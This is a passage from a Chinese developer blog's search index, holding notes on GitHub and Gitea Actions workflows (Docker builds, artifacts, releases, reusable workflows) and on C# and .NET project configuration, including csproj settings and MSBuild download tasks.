docker/build-push-action@v4 with: context: . file: ./Dockerfile push: true tags: user/app:latest ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/:2:3","series":null,"tags":["blog","CICD"],"title":"CICD-Actions","uri":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/#docker-构建"},{"categories":["blog"],"content":" Docker 构建 Gitea 版本 name: docker on: push: workflow_dispatch: jobs: test-docker: runs-on: ubuntu-latest container: catthehacker/ubuntu:act-latest steps: - name: check docker version run: | docker version Github 版本Build and push Docker images · Actions · GitHub Marketplace · GitHub jobs: docker: runs-on: ubuntu-latest steps: - name: Set up Docker Buildx uses: docker/setup-buildx-action@v2 - name: check docker version run: | docker version - name: Login to Docker Hub uses: docker/login-action@v2 with: username: ${{ secrets.DOCKERHUB_USERNAME }} password: ${{ secrets.DOCKERHUB_TOKEN }} - name: Build and push uses: docker/build-push-action@v4 with: context: . file: ./Dockerfile push: true tags: user/app:latest ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/:2:3","series":null,"tags":["blog","CICD"],"title":"CICD-Actions","uri":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/#gitea-版本"},{"categories":["blog"],"content":" Docker 构建 Gitea 版本 name: docker on: push: workflow_dispatch: jobs: test-docker: runs-on: ubuntu-latest container: catthehacker/ubuntu:act-latest steps: - name: check docker version run: | docker version Github 版本Build and push Docker images · Actions · GitHub Marketplace · GitHub jobs: docker: runs-on: ubuntu-latest steps: - name: Set up Docker Buildx uses: docker/setup-buildx-action@v2 - name: check docker version run: | docker version - name: Login to Docker Hub uses: docker/login-action@v2 with: username: ${{ secrets.DOCKERHUB_USERNAME }} password: ${{ secrets.DOCKERHUB_TOKEN }} - name: Build and push uses: docker/build-push-action@v4 with: context: . file: ./Dockerfile push: true tags: user/app:latest ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/:2:3","series":null,"tags":["blog","CICD"],"title":"CICD-Actions","uri":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/#github-版本"},{"categories":["blog"],"content":" 内置变量 name: build-in env on: push: workflow_dispatch: jobs: build-in-env: runs-on: ubuntu-latest steps: # 所有的内置对象示例 https://docs.github.com/en/actions/learn-github-actions/contexts#example-contents-of-the-github-context - run: echo ${{ github.event_name }} - run: echo ${{ runner.os }} - run: echo ${{ github.ref }} - run: echo ${{ github.repository }} - run: echo ${{ github.workspace }} - name: List files in the repository run: | ls ${{ github.workspace }} - run: echo ${{ job.status }} - run: echo ${{ github.api_url }} - run: echo ${{ github.server_url }} - run: echo ${{ github.base_ref }} - run: sleep 2 ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/:2:4","series":null,"tags":["blog","CICD"],"title":"CICD-Actions","uri":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/#内置变量"},{"categories":["blog"],"content":" 上传,下载,Release name: release on: push: workflow_dispatch: jobs: build-1: runs-on: ubuntu-latest steps: - run: | touch 1.txt echo 1 \u003e 1.txt - name: upload txt1 uses: actions/upload-artifact@v3 with: name: txt1 path: 1.txt build-2: runs-on: ubuntu-latest steps: - run: | touch 2.txt echo 2 \u003e 2.txt - name: upload txt2 uses: actions/upload-artifact@v3 with: name: txt2 path: 2.txt test-release-gitea: needs: [build-1, build-2] runs-on: ubuntu-latest # gitea 必须要tag,否则无法工作,同时避免在github上运行 # if: ${{ startsWith(github.ref, 'refs/tags/') \u0026\u0026 contains(github.server_url, '你的服务器地址,例如github.com') }} if: ${{ startsWith(github.ref, 'refs/tags/') \u0026\u0026 contains(github.server_url, 'ken') }} steps: - name: download txt uses: actions/download-artifact@v3 with: name: txt1 - name: setup go uses: actions/setup-go@v4 with: go-version: \"\u003e=1.20.1\" - name: release id: release1 uses: https://gitea.com/actions/release-action@main with: files: |- txt1/1.txt api_key: \"${{secrets.RELEASE_TOKEN}}\" test-release-github: runs-on: ubuntu-latest needs: [build-1, build-2] # 打tag才运行,且避免在gitea上运行 if: ${{ startsWith(github.ref, 'refs/tags/') \u0026\u0026 contains(github.server_url, 'github') }} steps: # 下载特定artifact # - name: download txt # uses: actions/download-artifact@v3 # with: # name: txt2 - name: download txt uses: actions/download-artifact@v3 - run: | ls cat txt1/1.txt cat txt2/2.txt - name: release id: release uses: \"marvinpinto/action-automatic-releases@latest\" with: repo_token: \"${{ secrets.GITHUB_TOKEN }}\" automatic_release_tag: \"latest\" prerelease: false title: \"${{ github.ref_name }}\" # kentxxq.Cli是tag构建,所以输出的是tag名称 files: | txt2/2.txt ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/:2:5","series":null,"tags":["blog","CICD"],"title":"CICD-Actions","uri":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/#上传下载release"},{"categories":["blog"],"content":" Csharp 构建示例 name: check-dotnet-single-file on: push: paths: - \"**/workflows/check-dotnet-single-file.yml\" workflow_dispatch: jobs: linux-x64-dotnet8-StripSymbols: runs-on: ubuntu-latest steps: - name: checkout uses: actions/checkout@v3 - name: setup dotnet uses: actions/setup-dotnet@v3 with: dotnet-version: \"8\" - name: command run: | dotnet new console --name hello-world -f net8.0 cd hello-world cat hello-world.csproj dotnet publish -r linux-x64 -c Release -p:PublishTrimmed=true -p:PublishAot=true -p:StripSymbols=true --self-contained ls -lh bin/Release/net8.0/linux-x64/publish/hello-world linux-x64-dotnet7-StripSymbols: runs-on: ubuntu-latest steps: - name: checkout uses: actions/checkout@v3 - name: setup dotnet uses: actions/setup-dotnet@v3 with: dotnet-version: \"7\" - name: command run: | dotnet new console --name hello-world -f net7.0 cd hello-world cat hello-world.csproj dotnet publish -r linux-x64 -c Release -p:PublishTrimmed=true -p:PublishAot=true -p:StripSymbols=true --self-contained ls -lh bin/Release/net7.0/linux-x64/publish/hello-world linux-x64-dotnet6: runs-on: ubuntu-latest steps: - name: checkout uses: actions/checkout@v3 - name: setup dotnet uses: actions/setup-dotnet@v3 with: dotnet-version: \"6\" - name: command run: | dotnet new console --name hello-world -f net6.0 cd hello-world dotnet publish -r linux-x64 -c Release -p:PublishSingleFile=true -p:PublishTrimmed=true --self-contained true ls -lh bin/Release/net6.0/linux-x64/publish/hello-world linux-x64-dotnet7: runs-on: ubuntu-latest steps: - name: checkout uses: actions/checkout@v3 - name: setup dotnet uses: actions/setup-dotnet@v3 with: dotnet-version: \"7\" - name: command run: | dotnet new console --name hello-world -f net7.0 cd hello-world dotnet publish -r linux-x64 -c Release -p:PublishSingleFile=true -p:PublishTrimmed=true --self-contained true ls -lh bin/Release/net7.0/linux-x64/publish/hello-world # win-x64-dotnet7: # if: ${{ startsWith(github.ref, 'refs/tags/') \u0026\u0026 contains(github.server_url, 'github') }} # runs-on: windows-latest # steps: # - name: checkout # uses: actions/checkout@v3 # - name: setup dotnet # uses: actions/setup-dotnet@v3 # with: # dotnet-version: \"7\" # - name: command # run: | # dotnet new console --name hello-world -f net7.0 # cd hello-world # dotnet publish -r win-x64 -c Release -p:PublishSingleFile=true -p:PublishTrimmed=true --self-contained true # ls bin\\Release\\net7.0\\win-x64\\publish\\ ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/:3:0","series":null,"tags":["blog","CICD"],"title":"CICD-Actions","uri":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/#csharp-构建示例"},{"categories":["blog"],"content":" 组织流水线","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/:4:0","series":null,"tags":["blog","CICD"],"title":"CICD-Actions","uri":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/#组织流水线"},{"categories":["blog"],"content":" 创建一个复用流水线复用流水线地址 octo-org/example-repo/.github/workflows/reusable-workflow.yml@main name: Reusable workflow example on: workflow_call: inputs: config-path: required: true type: string secrets: token: required: true jobs: triage: runs-on: ubuntu-latest steps: - uses: actions/labeler@v4 with: repo-token: ${{ secrets.token }} configuration-path: ${{ inputs.config-path }} ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/:4:1","series":null,"tags":["blog","CICD"],"title":"CICD-Actions","uri":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/#创建一个复用流水线"},{"categories":["blog"],"content":" 复用流水线 jobs: call-workflow-passing-data: # uses: ./.github/workflows/workflow-2.yml # uses: octo-org/another-repo/.github/workflows/workflow.yml@v1 # uses: octo-org/this-repo/.github/workflows/workflow-1.yml@172239021f7ba04fe7327647b213799853a9eb89 uses: octo-org/example-repo/.github/workflows/reusable-workflow.yml@main with: config-path: .github/labeler.yml secrets: envPAT: ${{ secrets.envPAT }} ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/:4:2","series":null,"tags":["blog","CICD"],"title":"CICD-Actions","uri":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/#复用流水线"},{"categories":["blog"],"content":" 设计成一个工作流ecs, docker, 小程序 等等发版流程, 做成 workflow. 开发人员在引入我们的 workflow 后, 在 repo 配置环境变量即可运行. ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/:4:3","series":null,"tags":["blog","CICD"],"title":"CICD-Actions","uri":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/#设计成一个工作流"},{"categories":["blog"],"content":" 不兼容 Gitea 不支持并发 concurrency Gitea 只能复制流水线, 无法和 github 一样页面导入 工作流程 - GitHub 文档 ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/:5:0","series":null,"tags":["blog","CICD"],"title":"CICD-Actions","uri":"/posts/%E7%AC%94%E8%AE%B0/cicd-actions/#不兼容"},{"categories":["blog"],"content":"[[笔记/point/csharp|csharp]] 的项目相关配置, 帮助组织规范项目. 同时优化运行时的一些指标参数.","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/","series":null,"tags":["blog","csharp"],"title":"csharp项目配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":" 简介csharp 的项目配置文章中，没有任何代码相关内容。 ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/:1:0","series":null,"tags":["blog","csharp"],"title":"csharp项目配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/#简介"},{"categories":["blog"],"content":" 常用命令","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/:2:0","series":null,"tags":["blog","csharp"],"title":"csharp项目配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/#常用命令"},{"categories":["blog"],"content":" dotnet-new 模板 # 新建git项目,clone下来后使用。建议用 kentxxq.Kscheduler 标识.产品名 # 创建一个当前文件夹同名sln文件，可以执行-n kentxxq.Kscheduler dotnet new sln # 创建项目。使用 标识.产品名.模块 dotnet new webapi --name kentxxq.Kscheduler.webapi --use-controllers --no-https # 添加项目 dotnet sln add .\\kentxxq.Kscheduler.webapi\\kentxxq.Kscheduler.webapi.csproj # 查看所有的包 dotnet new --list # 卸载包 dotnet new --uninstall # 搜包 dotnet new search kentxxq.Templates # 安装 dotnet new install kentxxq.Templates # 使用 dotnet new k-webapi --name certmanager ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/:2:1","series":null,"tags":["blog","csharp"],"title":"csharp项目配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/#dotnet-new-模板"},{"categories":["blog"],"content":" nuget 推包 # 先打包成nupkg dotnet nuget push kentxxq.Extensions.1.1.0.nupkg --api-key key ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/:2:2","series":null,"tags":["blog","csharp"],"title":"csharp项目配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/#nuget-推包"},{"categories":["blog"],"content":" nuget 缓存路径配置 setx /M NUGET_PACKAGES D:\\\u003cusername\u003e\\.nuget\\packages ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/:2:3","series":null,"tags":["blog","csharp"],"title":"csharp项目配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/#nuget-缓存路径配置"},{"categories":["blog"],"content":" 更新所有 dotnet-tools dotnet tool list -g | ForEach-Object {$index = 0} { $index++; if($index -gt 2) { dotnet tool update -g $_.split(\" \")[0] } } ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/:2:4","series":null,"tags":["blog","csharp"],"title":"csharp项目配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/#更新所有-dotnet-tools"},{"categories":["blog"],"content":" 项目配置.NET 项目 SDK 概述 | Microsoft Learn ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/:3:0","series":null,"tags":["blog","csharp"],"title":"csharp项目配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/#项目配置"},{"categories":["blog"],"content":" 配置项参考 发布文件配置命令行的简化版本 dotnet restore dotnet publish -c Release -o out -r linux-x64 -p:PublishSingleFile=true --self-contained true 发布文件配置 linux-x64.pubxml # 指定csproj使用，因为sln解决方案级别的不支持指定-o # -c Release 覆盖文件里的 Configuration # -o 覆盖文件里的 PublishDir dotnet publish .\\TestServer\\TestServer.csproj -o out1 /p:PublishProfile=Properties\\PublishProfiles\\linux-x64.pubxml \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!-- https://go.microsoft.com/fwlink/?LinkID=208121. --\u003e \u003cProject\u003e \u003cPropertyGroup\u003e \u003cDeleteExistingFiles\u003etrue\u003c/DeleteExistingFiles\u003e \u003cConfiguration\u003eRelease\u003c/Configuration\u003e \u003cPlatform\u003eAny CPU\u003c/Platform\u003e \u003cPublishDir\u003eout2\u003c/PublishDir\u003e \u003cPublishProtocol\u003eFileSystem\u003c/PublishProtocol\u003e \u003c_TargetId\u003eFolder\u003c/_TargetId\u003e \u003cTargetFramework\u003enet8.0\u003c/TargetFramework\u003e \u003cRuntimeIdentifier\u003elinux-x64\u003c/RuntimeIdentifier\u003e \u003cSelfContained\u003etrue\u003c/SelfContained\u003e \u003cPublishSingleFile\u003etrue\u003c/PublishSingleFile\u003e \u003cPublishReadyToRun\u003efalse\u003c/PublishReadyToRun\u003e \u003c/PropertyGroup\u003e \u003c/Project\u003e 已知 aot 的时候 IncludeNativeLibrariesForSelfExtract 会失败 如果没有生效, 可以 -p 手动传参. dotnet publish -c Release -r linux-x 64 -p:IncludeNativeLibrariesForSelfExtract=true -r runtime 可以指定系统和架构，例如 linux-64 完整的支持列表在这里 项目文件配置项目文件配置 xxx.csproj \u003cProject Sdk=\"Microsoft.NET.Sdk\"\u003e \u003cPropertyGroup\u003e \u003cTargetFramework\u003enet8.0\u003c/TargetFramework\u003e \u003c!-- 减少空指针异常 --\u003e \u003cNullable\u003eenable\u003c/Nullable\u003e \u003c!-- 全局using --\u003e \u003cImplicitUsings\u003eenable\u003c/ImplicitUsings\u003e \u003c!-- 默认linux容器 --\u003e \u003cDockerDefaultTargetOS\u003eLinux\u003c/DockerDefaultTargetOS\u003e \u003c!-- 锁定包版本 https://learn.microsoft.com/zh-cn/nuget/consume-packages/package-references-in-project-files#locking-dependencies --\u003e \u003cRestorePackagesWithLockFile\u003etrue\u003c/RestorePackagesWithLockFile\u003e \u003c!-- 可以被Version替代,弃用 --\u003e \u003c!-- 生成包信息 https://learn.microsoft.com/zh-cn/dotnet/core/project-sdk/msbuild-props#generateassemblyinfo --\u003e \u003c!-- \u003cGenerateAssemblyInfo\u003etrue\u003c/GenerateAssemblyInfo\u003e --\u003e \u003c!-- 版本信息 kentxxq.cli通过这个定义版本号 --\u003e \u003c!-- \u003cInformationalVersion\u003e1.0.0\u003c/InformationalVersion\u003e --\u003e \u003cVersion\u003e1.0.0\u003c/Version\u003e \u003c!-- 删除已存在的文件 --\u003e \u003cDeleteExistingFiles\u003etrue\u003c/DeleteExistingFiles\u003e \u003c!-- 需要机制优化的时候使用 https://learn.microsoft.com/zh-cn/dotnet/core/deploying/trimming/trimming-options?pivots=dotnet-7-0#trimming-framework-library-features --\u003e \u003c!-- 删除debug信息,祝你好运... --\u003e \u003cDebuggerSupport\u003efalse\u003c/DebuggerSupport\u003e \u003c!-- 删除eventsource,无法trace追踪了.. --\u003e \u003cEventSourceSupport\u003efalse\u003c/EventSourceSupport\u003e \u003c!-- http诊断 --\u003e \u003cHttpActivityPropagationSupport\u003efalse\u003c/HttpActivityPropagationSupport\u003e \u003c!-- 删除过时的序列化 --\u003e \u003cEnableUnsafeBinaryFormatterSerialization\u003efalse\u003c/EnableUnsafeBinaryFormatterSerialization\u003e \u003c!-- 全球化,我总是用一组固定的ui展示 --\u003e \u003cInvariantGlobalization\u003etrue\u003c/InvariantGlobalization\u003e \u003c!-- System.* 的异常信息会被简化变成相当差 --\u003e \u003cUseSystemResourceKeys\u003etrue\u003c/UseSystemResourceKeys\u003e \u003c!-- ilc https://devblogs.microsoft.com/dotnet/performance_improvements_in_net_7/ --\u003e \u003cIlcOptimizationPreference\u003eSize\u003c/IlcOptimizationPreference\u003e \u003cIlcGenerateStackTraceData\u003efalse\u003c/IlcGenerateStackTraceData\u003e \u003c!-- 默认会综合考虑size和speed,不建议单独开启下面2个 --\u003e \u003c!-- \u003cOptimizationPreference\u003eSize\u003c/OptimizationPreference\u003e --\u003e \u003c!-- \u003cOptimizationPreference\u003eSpeed\u003c/OptimizationPreference\u003e --\u003e \u003c!-- Cli --\u003e \u003cOutputType\u003eExe\u003c/OutputType\u003e \u003c!-- 构建出来的名字 --\u003e \u003cAssemblyName\u003eken\u003c/AssemblyName\u003e \u003c!-- 自包含 --\u003e \u003cSelfContained\u003etrue\u003c/SelfContained\u003e \u003c!-- 启用 aot, 和 PublishSingleFile 冲突 --\u003e \u003cPublishAot\u003etrue\u003c/PublishAot\u003e \u003c!-- 单个文件, 和aot冲突 --\u003e \u003cPublishSingleFile\u003etrue\u003c/PublishSingleFile\u003e \u003c!-- 缩减大小 --\u003e \u003cPublishTrimmed\u003etrue\u003c/PublishTrimmed\u003e \u003c!-- 分离pdb调试文件,可执行文件 https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/?tabs=net8plus#native-debug-information --\u003e \u003cStripSymbols\u003etrue\u003c/StripSymbols\u003e \u003c!-- 压缩一下大小 --\u003e \u003cEnableCompressionInSingleFile\u003etrue\u003c/EnableCompressionInSingleFile\u003e \u003c!-- 包含二进制库 --\u003e \u003cIncludeNativeLibrariesForSelfExtract\u003etrue\u003c/IncludeNativeLibrariesForSelfExtract\u003e \u003c!-- 打包所有文件,然后解压使用 --\u003e \u003cIncludeAllContentForSelfExtract\u003etrue\u003c/IncludeAllContentForSelfExtract\u003e \u003c!-- Web --\u003e \u003c!-- 拷贝swagger文件 --\u003e \u003cDocumentationFile\u003ebin\\Debug\\MyApi.xml\u003c/DocumentationFile\u003e \u003c!-- Nuget --\u003e \u003c!-- 打包常用 https://learn.microsoft.com/zh-cn/nuget/reference/msbuil","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/:3:1","series":null,"tags":["blog","csharp"],"title":"csharp项目配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/#配置项参考"},{"categories":["blog"],"content":" 配置项参考 发布文件配置命令行的简化版本 dotnet restore dotnet publish -c Release -o out -r linux-x64 -p:PublishSingleFile=true --self-contained true 发布文件配置 linux-x64.pubxml # 指定csproj使用，因为sln解决方案级别的不支持指定-o # -c Release 覆盖文件里的 Configuration # -o 覆盖文件里的 PublishDir dotnet publish .\\TestServer\\TestServer.csproj -o out1 /p:PublishProfile=Properties\\PublishProfiles\\linux-x64.pubxml \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e true Release Any CPU out2 FileSystem \u003c_TargetId\u003eFolder\u003c/_TargetId\u003e net8.0 linux-x64 true true false 已知 aot 的时候 IncludeNativeLibrariesForSelfExtract 会失败 如果没有生效, 可以 -p 手动传参. dotnet publish -c Release -r linux-x 64 -p:IncludeNativeLibrariesForSelfExtract=true -r runtime 可以指定系统和架构，例如 linux-64 完整的支持列表在这里 项目文件配置项目文件配置 xxx.csproj net8.0 enable enable Linux true 1.0.0 true false false false false true true Size false Exe ken true true true true true true true true bin\\Debug\\MyApi.xml ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/:3:1","series":null,"tags":["blog","csharp"],"title":"csharp项目配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/#发布文件配置"},{"categories":["blog"],"content":" 配置项参考 发布文件配置命令行的简化版本 dotnet restore dotnet publish -c Release -o out -r linux-x64 -p:PublishSingleFile=true --self-contained true 发布文件配置 linux-x64.pubxml # 指定csproj使用，因为sln解决方案级别的不支持指定-o # -c Release 覆盖文件里的 Configuration # -o 覆盖文件里的 PublishDir dotnet publish .\\TestServer\\TestServer.csproj -o out1 /p:PublishProfile=Properties\\PublishProfiles\\linux-x64.pubxml \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e true Release Any CPU out2 FileSystem \u003c_TargetId\u003eFolder\u003c/_TargetId\u003e net8.0 linux-x64 true true false 已知 aot 的时候 IncludeNativeLibrariesForSelfExtract 会失败 如果没有生效, 可以 -p 手动传参. dotnet publish -c Release -r linux-x 64 -p:IncludeNativeLibrariesForSelfExtract=true -r runtime 可以指定系统和架构，例如 linux-64 完整的支持列表在这里 项目文件配置项目文件配置 xxx.csproj net8.0 enable enable Linux true 1.0.0 true false false false false true true Size false Exe ken true true true true true true true true bin\\Debug\\MyApi.xml ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/:3:1","series":null,"tags":["blog","csharp"],"title":"csharp项目配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/#项目文件配置"},{"categories":["blog"],"content":" 项目引入 aspnetcore \u003cProject Sdk=\"Microsoft.NET.Sdk\"\u003e \u003cItemGroup\u003e \u003cFrameworkReference Include=\"Microsoft.AspNetCore.App\" /\u003e \u003c/ItemGroup\u003e \u003c/Project\u003e ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/:3:2","series":null,"tags":["blog","csharp"],"title":"csharp项目配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/#项目引入-aspnetcore"},{"categories":["blog"],"content":" 执行 msbuild 任务 官方文档MSBuild Task Reference - MSBuild | Microsoft Learn 拷贝文件 Copy构建的时候, 拷贝 xx 文件到 xx 目录下面. \u003cProject xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\"\u003e \u003cPropertyGroup\u003e \u003cip2regionDB\u003ehttps://ghproxy.com/https://github.com/lionsoul2014/ip2region/blob/master/data/ip2region.xdb\u003c/ip2regionDB\u003e \u003c/PropertyGroup\u003e \u003cTarget Name=\"DownloadContentFiles\" BeforeTargets=\"Build\" Condition=\"!Exists('$(PublishDir)/ip2region.xdb')\"\u003e \u003cDownloadFile SourceUrl=\"$(ip2regionDB)\" DestinationFolder=\"$(PublishDir)\"\u003e \u003cOutput TaskParameter=\"DownloadedFile\" ItemName=\"Content\" /\u003e \u003c/DownloadFile\u003e \u003c/Target\u003e \u003c/Project\u003e [!info] dotnet publish 的 -o,--output 是映射到 MSBUILD 的 PublishDir,而不是 OutputPath 下载任务 DownloadFile在构建之前, 下载文件到本地. ip2region 就用到了. MSBuildProjectDirectory: 是 csproj 所在的目录 OutputPath: 是构建物输出的目录 PublishDir: 是 dotnet publish -o 指定的目录 \u003cProject xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\"\u003e \u003cPropertyGroup\u003e \u003cip2regionDB\u003ehttps://ghproxy.com/https://github.com/lionsoul2014/ip2region/blob/master/data/ip2region.xdb\u003c/ip2regionDB\u003e \u003c/PropertyGroup\u003e \u003cTarget Name=\"DownloadPublishDirFiles\" AfterTargets=\"Publish\" Condition=\"!Exists('$(PublishDir)/ip2region.xdb')\"\u003e \u003cDownloadFile SourceUrl=\"$(ip2regionDB)\" DestinationFolder=\"$(PublishDir)\"\u003e \u003cOutput TaskParameter=\"DownloadedFile\" ItemName=\"Content\"/\u003e \u003c/DownloadFile\u003e \u003c/Target\u003e \u003cTarget Name=\"DownloadOutputPathFiles\" BeforeTargets=\"Build\" Condition=\"!Exists('$(OutputPath)/ip2region.xdb')\"\u003e \u003cDownloadFile SourceUrl=\"$(ip2regionDB)\" DestinationFolder=\"$(OutputPath)\"\u003e \u003cOutput TaskParameter=\"DownloadedFile\" ItemName=\"Content\"/\u003e \u003c/DownloadFile\u003e \u003c/Project\u003e ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/:3:3","series":null,"tags":["blog","csharp"],"title":"csharp项目配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/#执行-msbuild-任务"},{"categories":["blog"],"content":" 执行 msbuild 任务 官方文档MSBuild Task Reference - MSBuild | Microsoft Learn 拷贝文件 Copy构建的时候, 拷贝 xx 文件到 xx 目录下面. https://ghproxy.com/https://github.com/lionsoul2014/ip2region/blob/master/data/ip2region.xdb [!info] dotnet publish 的 -o,--output 是映射到 MSBUILD 的 PublishDir,而不是 OutputPath 下载任务 DownloadFile在构建之前, 下载文件到本地. ip2region 就用到了. MSBuildProjectDirectory: 是 csproj 所在的目录 OutputPath: 是构建物输出的目录 PublishDir: 是 dotnet publish -o 指定的目录 https://ghproxy.com/https://github.com/lionsoul2014/ip2region/blob/master/data/ip2region.xdb ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/:3:3","series":null,"tags":["blog","csharp"],"title":"csharp项目配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/#官方文档"},{"categories":["blog"],"content":" 执行 msbuild 任务 官方文档MSBuild Task Reference - MSBuild | Microsoft Learn 拷贝文件 Copy构建的时候, 拷贝 xx 文件到 xx 目录下面. https://ghproxy.com/https://github.com/lionsoul2014/ip2region/blob/master/data/ip2region.xdb [!info] dotnet publish 的 -o,--output 是映射到 MSBUILD 的 PublishDir,而不是 OutputPath 下载任务 DownloadFile在构建之前, 下载文件到本地. ip2region 就用到了. MSBuildProjectDirectory: 是 csproj 所在的目录 OutputPath: 是构建物输出的目录 PublishDir: 是 dotnet publish -o 指定的目录 https://ghproxy.com/https://github.com/lionsoul2014/ip2region/blob/master/data/ip2region.xdb ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/:3:3","series":null,"tags":["blog","csharp"],"title":"csharp项目配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/#拷贝文件-copy"},{"categories":["blog"],"content":" 执行 msbuild 任务 官方文档MSBuild Task Reference - MSBuild | Microsoft Learn 拷贝文件 Copy构建的时候, 拷贝 xx 文件到 xx 目录下面. https://ghproxy.com/https://github.com/lionsoul2014/ip2region/blob/master/data/ip2region.xdb [!info] dotnet publish 的 -o,--output 是映射到 MSBUILD 的 PublishDir,而不是 OutputPath 下载任务 DownloadFile在构建之前, 下载文件到本地. ip2region 就用到了. MSBuildProjectDirectory: 是 csproj 所在的目录 OutputPath: 是构建物输出的目录 PublishDir: 是 dotnet publish -o 指定的目录 https://ghproxy.com/https://github.com/lionsoul2014/ip2region/blob/master/data/ip2region.xdb 